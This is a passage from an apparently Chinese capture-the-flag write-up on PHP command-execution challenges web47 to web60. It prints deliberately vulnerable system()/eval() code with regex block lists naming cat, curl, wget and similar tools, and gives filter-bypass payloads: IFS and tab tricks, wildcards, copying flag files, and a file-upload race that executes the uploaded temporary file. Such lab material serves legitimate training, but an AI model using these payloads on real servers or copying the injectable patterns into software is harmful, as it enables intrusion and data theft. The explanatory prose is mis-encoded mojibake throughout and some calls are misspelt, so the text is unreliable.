?c=tac%09f?ag.php%0a</code></p><p>ä¾æ—§è¿˜æ˜¯è¿‡æ»¤ï¼Œ<code>$</code>ä¸èƒ½ç”¨äº†ï¼Œæ¢ä¸ªç©ºæ ¼çš„ä»£æ›¿å³å¯</p><h1 id="web47"><a href="#web47" class="headerlink" title="web47()"></a>web47()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=tac%09f?ag.php%0a</code></p><p>ç¦ç”¨äº†ä¸€å¤§å †å‘½ä»¤ï¼Œä¸Šé¢˜çš„payloadä¾æ—§èƒ½ç”¨</p><h1 id="web48"><a href="#web48" class="headerlink" title="web48()"></a>web48()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=tac%09f?ag.php%0a</code></p><p>ç¦ç”¨çš„æ›´å¤šäº†ï¼Œä½†æ˜¯ä¸å½±å“æˆ‘ä»¬ç”¨ä¸Šé¢˜çš„paylaod</p><h1 id="web49"><a href="#web49" class="headerlink" title="web49()"></a>web49()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=tac%09f?ag.php%0a</code></p><p>ä¾æ—§ä¸å˜</p><h1 id="web50-nl"><a href="#web50-nl" class="headerlink" title="web50(nl)"></a>web50(nl)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>09</code>è¢«ç¦ç”¨äº†ï¼Œç©ºé¢ä¹Ÿç”¨ä¸äº†ï¼Œåªèƒ½å°è¯•ç”¨ä¸å¸¦ç©ºæ ¼çš„å‘½ä»¤<code>nl</code>äº†ï¼ˆcatçš„æ›¿ä»£å‡½æ•°ï¼‰</p><p><code>nl</code>ä¸æ”¯æŒé€šé…ç¬¦ï¼Œä¸èƒ½ç”¨<code>fl?g.php</code>ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨shellç‰¹æ€§<code>&#39;&#39;</code>åˆ†å‰²</p><p><code>payload: ?c=nl&lt;fl&#39;&#39;ag.php%0a</code></p><h1 id="web51"><a href="#web51" class="headerlink" title="web51()"></a>web51()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=nl&lt;fl&#39;&#39;ag.php%0a</code></p><p>è·Ÿä¸Šé“é¢˜ä¸€æ ·</p><h1 id="web52"><a href="#web52" class="headerlink" title="web52()"></a>web52()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿‡æ»¤äº†<code>&lt;</code>ï¼Œä½†æ˜¯æ²¡ç¦ç”¨<code>$</code>å’Œï¼Œå˜¿å˜¿</p><p>å¯ä»¥è€ƒè™‘åˆ©ç”¨<code>cp</code>å‘½ä»¤ï¼Œå¤åˆ¶flag.phpæ–‡ä»¶</p><p>åˆ©ç”¨<code>?c=cp$&#123;IFS&#125;fl?g.php$&#123;IFS&#125;a.txt%0a</code>å°†flag.phpå¤åˆ¶åˆ°a.txtä¸­ï¼Œåœ¨åˆ©ç”¨<code>ls</code>å‘½ä»¤æŸ¥çœ‹æ˜¯å¦æ‹·è´æˆåŠŸ</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52.png" alt=""></p><p>æˆåŠŸæ‹·è´ï¼Œè®¿é—®a.txtå³å¯</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52_01.png" alt=""></p><p>å‘ç°æ˜¯ä¸ªå‡çš„flagï¼Œå°è¯•æŸ¥çœ‹å…¶å®ƒç›®å½•ï¼Œä½†æ˜¯åˆ©ç”¨çš„æ–¹æ³•è¿˜æ˜¯ä¸€æ ·çš„</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/52_02.png" alt=""></p><p>åœ¨æ ¹ç›®å½•å‘ç°flagï¼Œåˆ©ç”¨<code>cp$&#123;IFS&#125;/fl?g$&#123;IFS&#125;/var/www/html/b.txt</code>å°†flagæ‹·è´åˆ°æˆ‘ä»¬èƒ½è®¿é—®åˆ°çš„ç›®å½•ä¸‹ï¼Œè®¿é—®b.txtï¼Œæ‹¿åˆ°flag</p><h1 id="web53"><a href="#web53" class="headerlink" title="web53()"></a>web53()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ“ä½œæ–¹æ³•åŒä¸Šï¼Œåªä¸è¿‡è¿™æ¬¡<code>ls</code>æ˜¾ç¤ºçš„flag.phpæ˜¯çœŸçš„ï¼Œç›´æ¥æ‹·è´å¤åˆ¶ï¼Œè®¿é—®å³å¯</p><p><code>payload: ?c=cp$&#123;IFS&#125;fl?g.php$&#123;IFS&#125;a.txt%0a    è®¿é—®a.txt</code></p><h1 id="web54"><a href="#web54" class="headerlink" title="web54()"></a>web54()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=mv$&#123;IFS&#125;f???.php$&#123;IFS&#125;b.txt%0a    è®¿é—®b.txt</code></p><p>æœ¬é¢˜è¿‡æ»¤çš„æœ‰ç‚¹ä¸§å¿ƒç—…ç‹‚ï¼Œä½†æ˜¯å¯ä»¥ç”¨mvæŒ‡ä»¤è¿›è¡Œé‡å‘½å</p><h1 id="web55"><a href="#web55" class="headerlink" title="web55()"></a>web55()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>payload: ?c=/???/????64 ????.???</code> </p><p>æœ¬é¢˜è¿‡æ»¤äº†å­—æ¯ï¼Œä½†æ˜¯æ•°å­—æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œè¿™æ˜¯å¯ä»¥åˆ©ç”¨linuxä¸‹çš„<code>/bin/base64</code>ç»“åˆé€šé…ç¬¦ä½¿ç”¨</p><p>æœ€åå°†è¾“å‡ºçš„å†…å®¹è§£ç ï¼Œæ‹¿åˆ°flag</p><h1 id="web56-æ–‡ä»¶ä¸Šä¼ "><a href="#web56-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="web56(æ–‡ä»¶ä¸Šä¼ )"></a>web56(æ–‡ä»¶ä¸Šä¼ )</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…ˆæ¨èä¸¤ç¯‡æ–‡ç« </p><ul><li><a href="https://blog.sina.com.cn/s/blog_af68a2c201016nh2.html">LINUXä¸­çš„ç‚¹å‘½ä»¤</a></li><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">æ— å­—æ¯æ•°å­—webshellä¹‹æé«˜ç¯‡</a></li></ul><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡postä¸€ä¸ªæ–‡ä»¶(æ–‡ä»¶é‡Œé¢çš„shå‘½ä»¤)ï¼Œåœ¨ä¸Šä¼ çš„è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡<code>.(ç‚¹)</code>å»æ‰§è¡Œæ‰§è¡Œè¿™ä¸ªæ–‡ä»¶ã€‚(å½¢æˆäº†æ¡ä»¶ç«äº‰)ã€‚ä¸€èˆ¬æ¥è¯´è¿™ä¸ªæ–‡ä»¶åœ¨<a href="https://so.csdn.net/so/search?q=linux&amp;spm=1001.2101.3001.7020">linux</a>ä¸‹é¢ä¿å­˜åœ¨<code>/tmp/php??????</code>ä¸€èˆ¬åé¢çš„6ä¸ªå­—ç¬¦æ˜¯éšæœºç”Ÿæˆçš„æœ‰å¤§å°å†™ã€‚ï¼ˆå¯ä»¥é€šè¿‡linuxçš„åŒ¹é…ç¬¦å»åŒ¹é…ï¼‰</p><p>åˆ›å»ºä¸€ä¸ªPOSTæäº¤æ–‡ä»¶çš„htmlæ–‡ä»¶</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POSTæ–‡ä»¶ä¸Šä¼ <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://7ed0b631-cb94-479a-adc5-9c49fc745723.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--é“¾æ¥ä¸ºå½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>æ–‡ä»¶åï¼š<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span>  <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>  <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    &lt;<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™æŠ“åŒ…</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/56.png" alt=""></p><p>åœ¨ç¬¬ä¸€è¡Œæ·»åŠ å¦‚ä¸‹å†…å®¹ï¼šï¼ˆå›ºå®šæ ¼å¼ï¼‰</p><p><code>?c=.%20/???/????????[@-[]</code></p><p>å°†å†…å®¹ä¿®æ”¹ä¸ºpayload</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/56_01.png" alt=""></p><p>å°†æŠ“åŒ…å…³é—­ï¼Œå‘é€ï¼Œå‘ç°æˆåŠŸæ‰§è¡Œå‘½ä»¤</p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/56_02.png" alt=""></p><p>æœ€ç»ˆpayloadï¼š<code>cat f*</code></p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/56_03.png" alt=""></p><h1 id="web57"><a href="#web57" class="headerlink" title="web57($(()))"></a>web57($(()))</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat &quot;</span>.<span class="variable">$c</span>.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‘ç°è¿‡æ»¤äº†å¾ˆå¤šï¼Œä½†æ˜¯æç¤ºè¯´flagåœ¨36.phpä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„ç›®æ ‡åªéœ€è¦æ„é€ ä¸€ä¸ª36å³å¯</p><p>å‘ç°æ²¡æœ‰è¿‡æ»¤<code>$</code>å’Œ<code>()</code>ï¼Œåªéœ€è¦åˆ©ç”¨è¿™ä¸‰ä¸ªå°±å¯ä»¥æ„é€ </p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/57.png" alt=""></p><p>å‘ç°åªéœ€è¦æ„é€ 36ä¸ª-1åœ¨å–åå³å¯</p><p>æœ€ç»ˆpayloadï¼š<br><code>?c=$((~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))))</code></p><h1 id="web58-ç¦ç”¨å‡½æ•°"><a href="#web58-ç¦ç”¨å‡½æ•°" class="headerlink" title="web58(ç¦ç”¨å‡½æ•°)"></a>web58(ç¦ç”¨å‡½æ•°)</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰è¿‡æ»¤ï¼Ÿèœé¸¡ç‹‚å–œ</p><p>åœ¨è¾“å‡ºå‘½ä»¤çš„æ—¶å€™å‘ç°å¥½å¤šå‘½ä»¤éƒ½è¢«ç¦ç”¨äº†</p><p>å°è¯•åˆ©ç”¨æ–‡ä»¶è¯»å–</p><p><code>c=echo file_get_content(&quot;index.php&quot;);</code></p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/58.png" alt=""></p><p>å‘ç°å¹¶æ²¡æœ‰è¢«ç¦ç”¨ï¼Œç›²çŒœä¸€æ³¢ï¼Œç›´æ¥è¯»å–flag.php</p><p><code>c=echo file_get_content(&quot;flag.php&quot;);</code></p><p><img src="/img/CTFSHOW-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/58_01.png" alt=""></p><p>æˆåŠŸï¼</p><h1 id="web59"><a href="#web59" class="headerlink" title="web59()"></a>web59()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸è®©ç”¨<code>file_get_contents()</code>ï¼Œæ¢ä¸ªå…¶ä»–å‡½æ•°</p><p><code>paylaod: c=echo show_source(&quot;flag.php&quot;);</code></p><h1 id="web60"><a href="#web60" class="headerlink" title="web60()"></a>web60()</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span 